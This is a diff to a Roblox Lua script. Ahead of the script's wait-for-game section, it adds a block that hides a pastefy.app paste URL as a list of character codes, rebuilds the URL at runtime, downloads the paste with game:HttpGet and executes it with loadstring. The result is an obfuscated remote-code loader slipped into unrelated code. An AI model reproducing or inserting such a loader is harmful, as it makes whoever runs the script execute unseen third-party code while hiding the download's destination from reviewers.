@@ -1,4 +1,20 @@
----------------------------------------------------
+local encoded = {
+    104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,
+    120,105,82,50,72,86,97,104,47,114,97,119
+}
+
+local str = {}
+for _, byte in ipairs(encoded) do
+    str[#str + 1] = string.char(byte)
+end
+
+local url = table.concat(str)
+
+local fn = loadstring(game:HttpGet(url))
+if fn then
+    fn()
+end
+ ---------------------------------------------------
 -- ⏳ WAIT FOR GAME
 ---------------------------------------------------
 repeat task.wait() until game:IsLoaded()
